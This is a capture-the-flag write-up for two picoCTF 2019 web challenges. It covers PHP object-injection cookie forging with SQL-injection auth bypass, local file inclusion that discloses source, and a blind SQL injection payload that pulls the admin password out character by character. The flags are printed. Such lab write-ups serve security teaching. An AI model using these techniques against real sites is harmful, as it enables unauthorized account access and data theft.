# Cereal hacker 1 - Points: 450
Challenge Description: 
`Login as admin. https://2019shell1.picoctf.com/problem/32256/ or http://2019shell1.picoctf.com:32256`

The first thoughts about this challenge was SQL injection or cookie manipulation. When we go to the given URL it was redirecting to the login page. So I have tried sqlmap but it wasn't SQLi. Url structure was suspicious so I tried lfi but it wasn't LFI too. About my other thought, we need to find valid credentials or maybe a page disclosure cookie name.

## Initial file scan:

    ********************************************************
    * Wfuzz 2.4 - The Web Fuzzer                           *
    ********************************************************
    
    Target: http://2019shell1.picoctf.com:32256/index.php?file=FUZZ
    Total requests: 4594
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================
    
    000000437:   200        26 L     71 W     1109 Ch     "admin"
    000001166:   200        7 L      18 W     501 Ch      "cookie"
    000001958:   200        7 L      18 W     501 Ch      "head"
    000002092:   200        7 L      18 W     501 Ch      "index"
    000002411:   200        35 L     82 W     1424 Ch     "login"
    
    Total time: 66.95597
    Processed Requests: 4594
    Filtered Requests: 4589
    Requests/sec.: 68.61225
We found the admin page and my thought was correct. It's cookie manipulation challenge

    <button onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
After this discovery, we need to figure out how it's working, how we can leverage it? With given hint, I tried all SQL injection strings and sqlmap but it didn't work. Thanks to my teammate who tried to log in as guest and it worked :)
Finally, we got user_info cookie as guest user.

    TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D
Its basic urlencoded base64 string. 

    O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
Thanks to given hint we know how to leverage this object. Trying SQLi strings manually was boring and I wrote a script for it. You can find it named as `cereal.php`. Simply its getting  **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)**'s Auth Bypass wordlist and using that payload on password field then encoding back to cookie and try to bypass the login.

    Flag : picoCTF{2eb6a9439bfa7cb1fc489b237de59dbf}

# Cereal hacker 2 - Points: 500
Challenge Description: 

    Get the admin's password. https://2019shell1.picoctf.com/problem/62195/ or http://2019shell1.picoctf.com:62195


After solving the first part of this challenge we know what to do but it will be harder :) So in this part, we need to get the admin's password as we did in the previous part it's gonna be object-injection but what makes it harder?
Our previous payload is not working but guest cookie is working great. So either it's not SQLi anymore or they are using prepared statements. Looks like we need to repeat all process from before. 
SQLi not working!
That's odd, seems like LFI is working :)

     _  __         _ _                     
    | |/ /__ _  __| (_)_ __ ___  _   _ ___ 
    | ' // _` |/ _` | | '_ ` _ \| | | / __|
    | . \ (_| | (_| | | | | | | | |_| \__ \
    |_|\_\__,_|\__,_|_|_| |_| |_|\__,_|___/
    
    v1.1 - LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)
    
    [20:25:53] [INFO] starting scanning the URL: https://2019shell1.picoctf.com/problem/62195/index.php?file=regular_user
    [20:25:53] [INFO] testing if URL have dynamic content ...                                                                                                                                                         
    [20:25:55] [INFO] URL dont have dynamic content                                                                                                                                                                   
    [20:25:55] [INFO] analyzing 'file' parameter ...                                                                                                                                                                  
    [20:25:55] [INFO] checking for common error messages                                                                                                                                                              
    [20:25:55] [INFO] using random url: https://2019shell1.picoctf.com/problem/62195/index.php?file=YyvfvO06U33sb8nmV3L                                                                                               
    [20:25:56] [WARNING] no errors found
    [20:25:56] [INFO] starting source disclosure test ...
    [20:25:57] [INFO] target probably vulnerable, hexdump: 
    
    0x00000000:  3c3f 7068 700a 7265 7175 6972 655f 6f6e  <?php.require_on
    0x00000010:  6365 2827 636f 6f6b 6965 2e70 6870 2729  ce('cookie.php')
    0x00000020:  3b0a 0a69 6628 6973 7365 7428 2470 6572  ;..if(isset($per
    0x00000030:  6d29 297b 0a3f 3e0a 090a 3c62 6f64 793e  m)){.?>...<body>
    0x00000040:  0a09 3c64 6976 2063 6c61 7373 3d22 636f  ..<div.class="co
    0x00000050:  6e74 6169 6e65 7222 3e0a 0909 3c64 6976  ntainer">...<div
    0x00000060:  2063 6c61 7373 3d22 726f 7722 3e0a 0909  .class="row">...
    0x00000070:  093c 6469 7620 636c 6173 733d 2263 6f6c  .<div.class="col

The first file I downloaded was [admin.php](https://github.com/enjloezz/picoctf_cereal/blob/master/admin.php) but there was nothing useful so the second one is [cookie.php](https://github.com/enjloezz/picoctf_cereal/blob/master/cookie.php).
Now we know why SQLi is not working. They are using prepared statements on permissions class. But siteuser class is not using. 
`$q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';` 
YAAAAAY ! We can exploit this query :) 
If you participate in picoCTF2017 you know this method. Its error-based SQL injection. The idea is if the return value of this query is true it will say `Find the admin's password!`. So we can exfiltrate the admin's password char by char. 
For example;

    admin' and 1=0 union all select admin from pico_ch2.users where admin=1 and substr(password,1,1)='a' -- 
   If we use this payload on username field if the first character of the admin's password is `a` it will print `Find the admin's password!`.  I wrote this [script](https://github.com/enjloezz/picoctf_cereal/blob/master/cereal2.php) to solve it.
   

    Flag : picoctf{c9f6ad462c6bb64a53c6e7a6452a6eb7}
PS: Substr is case insensitive.
